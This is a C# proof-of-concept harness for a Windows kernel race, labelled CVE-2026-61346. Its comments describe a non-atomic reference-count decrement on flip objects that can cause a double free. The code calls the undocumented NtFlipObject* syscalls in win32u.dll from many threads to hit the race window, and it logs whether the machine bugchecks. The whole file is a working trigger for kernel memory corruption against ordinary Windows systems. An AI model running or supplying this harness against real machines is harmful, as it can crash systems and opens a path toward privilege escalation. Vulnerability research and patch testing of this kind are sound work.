using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

// CVE-2026-61346 race harness.
//
// CFlipResource / CFlipPropertySetBase reference counts are decremented with a
// non-atomic `add [mem],-1` and the zero-test uses a separate reload. Two
// threads calling Release concurrently while the count is 1 can both observe
// the transition to zero and both invoke the destructor -> double free.
//
// Stage 1 of this harness just establishes reachability: create a flip object
// and confirm the kernel path executes at all. Stage 2 spins N threads through
// the content-binding calls that drive the refcount, to try to land inside the
// three-instruction window.
class FlipRace
{
    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectCreate(IntPtr unused, out IntPtr handle);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectOpen(IntPtr a, IntPtr b, out IntPtr handle);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectAddContent(IntPtr flip, IntPtr content, IntPtr p3);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectRemoveContent(IntPtr flip, IntPtr content);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectSetContent(IntPtr flip, IntPtr content, IntPtr p3, IntPtr p4);

    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr h);

    static IntPtr gFlip = IntPtr.Zero;
    static long gIter = 0;
    static volatile bool gStop = false;

    static void Log(StreamWriter w, string s)
    {
        Console.WriteLine(s);
        w.WriteLine(s);
        w.Flush();
    }

    static void Main(string[] args)
    {
        int threads = args.Length > 0 ? int.Parse(args[0]) : 8;
        int seconds = args.Length > 1 ? int.Parse(args[1]) : 30;
        string outp = args.Length > 2 ? args[2] : @"C:\poc\race.log";

        using (var w = new StreamWriter(outp, false))
        {
            // ---- stage 1: reachability ----
            IntPtr h;
            int st = NtFlipObjectCreate(IntPtr.Zero, out h);
            Log(w, "NtFlipObjectCreate -> 0x" + st.ToString("X8") + "  handle=0x" + h.ToInt64().ToString("X"));
            if (st < 0)
            {
                Log(w, "create failed; cannot proceed to race stage");
                return;
            }
            gFlip = h;

            IntPtr h2;
            int st2 = NtFlipObjectOpen(IntPtr.Zero, IntPtr.Zero, out h2);
            Log(w, "NtFlipObjectOpen   -> 0x" + st2.ToString("X8") + "  handle=0x" + h2.ToInt64().ToString("X"));

            // ---- stage 2: hammer the content-binding paths ----
            Log(w, "spinning " + threads + " threads for " + seconds + "s ...");
            var ts = new Thread[threads];
            for (int i = 0; i < threads; i++)
            {
                ts[i] = new Thread(Worker);
                ts[i].IsBackground = true;
                ts[i].Start(i);
            }
            Thread.Sleep(seconds * 1000);
            gStop = true;
            Thread.Sleep(500);
            Log(w, "iterations: " + Interlocked.Read(ref gIter));
            Log(w, "survived (no bugcheck)");
        }
    }

    static void Worker(object idx)
    {
        var rnd = new Random(((int)idx) * 7919 + Environment.TickCount);
        while (!gStop)
        {
            IntPtr content = new IntPtr(rnd.Next(1, 0x400) * 4);
            NtFlipObjectAddContent(gFlip, content, IntPtr.Zero);
            NtFlipObjectSetContent(gFlip, content, IntPtr.Zero, IntPtr.Zero);
            NtFlipObjectRemoveContent(gFlip, content);
            Interlocked.Increment(ref gIter);
        }
    }
}
